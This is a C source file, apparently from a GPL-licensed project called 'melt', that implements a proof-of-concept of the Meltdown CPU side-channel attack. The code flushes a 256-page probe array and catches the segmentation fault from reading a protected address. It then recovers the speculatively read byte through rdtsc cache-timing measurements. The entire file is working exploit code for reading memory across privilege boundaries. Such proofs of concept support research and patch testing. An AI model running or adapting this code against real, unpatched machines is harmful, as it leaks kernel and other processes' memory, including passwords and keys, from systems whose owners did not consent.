/**
 * meltdown.c
 *
 * Copyright (C) 2018 Yuki Kusanagi
 *
 * This file is part of melt.
 *
 * melt is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * melt is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with melt.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include "meltdown.h"

#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <setjmp.h>

#define BYTE_NUM 256
#define CHUNK_SHIFT 0x0c
#define CHUNK_SIZE (1 << CHUNK_SHIFT)

static sigjmp_buf _jmp_buf;
static uint8_t *_tube = NULL;
static uint8_t _val = 0;

static void sigsegv_handler(int sig, siginfo_t *info, void *uap)
{
    int i, mini = 0;
    uint64_t t, mint = 0;
    uintptr_t p;

    for (i = 0; i < BYTE_NUM; i++)
    {
        p = (uintptr_t)_tube + i * CHUNK_SIZE;

        // measure
        __asm__ __volatile__(
            "mfence                 \n\t"
            "rdtsc                  \n\t" // read TSC
            "lfence                 \n\t"
            "movq    %%rax, %%rcx   \n\t" // save TSC
            "movb    (%[p]), %%al   \n\t" // access tube
            "lfence                 \n\t"
            "rdtsc                  \n\t" // read TSC
            "subq    %%rcx, %%rax   \n\t" // diff TSC
            "clflush (%[p])         \n\t" // clflush
            : "=&a"(t)
            : [p] "r"(p)
            : "rdx", "rcx"); // RDX are affected by RDTSC, RCX is used

        if (mint == 0 || t < mint)
        {
            mint = t;
            mini = i;
        }
    }

    printf("Guess: %02x, dTSC: %llu\n", mini, mint);

    _val = mini;

    siglongjmp(_jmp_buf, 1);
}

int meltdown(uintptr_t addr, uint8_t *val)
{
    int ret, i;
    uint64_t p;
    struct sigaction sa;

    // alloc _tube
    if ((ret = posix_memalign((void **)&_tube, CHUNK_SIZE, BYTE_NUM * CHUNK_SIZE)) != 0)
        goto exit;

    // clflush all
    for (i = 0; i < BYTE_NUM; i++)
    {
        p = (uint64_t)_tube + i * CHUNK_SIZE;
        __asm__ __volatile__(
            "lfence         \n\t"
            "clflush (%[p]) \n\t"
            :
            : [p] "r"(p));
    }

    // install signal handler
    sa.sa_sigaction = sigsegv_handler;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    if ((ret = sigaction(SIGSEGV, &sa, NULL)) != 0)
        goto exit;

    // catch SIGSEGV
    if (sigsetjmp(_jmp_buf, 0))
        goto cont;

    // probe
    __asm__ __volatile__(
        "mfence                         \n\t" // mfence
        "xorq   %%rax, %%rax            \n\t" // clear RAX
        "%=:                            \n\t" // retry (?)
        "movb   (%[addr]), %%al         \n\t" // read addr, this will raise SIGSEGV
        "shlq   %[SHIFT], %%rax         \n\t" // shift left
        "jz     %=b                     \n\t" // jz retry (?)
        "movq   (%[tube], %%rax), %%rax \n\t" // read from tube
        :
        : [addr] "r"(addr), [tube] "r"(_tube), [SHIFT] "J"(CHUNK_SHIFT)
        : "rax"); // RAX is used internally

cont:

    *val = _val;

exit:
    // uninstall signal handler
    sa.sa_handler = SIG_DFL;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);

    // free _tube
    if (_tube != NULL)
    {
        free(_tube);
        _tube = NULL;
    }
    return ret;
}
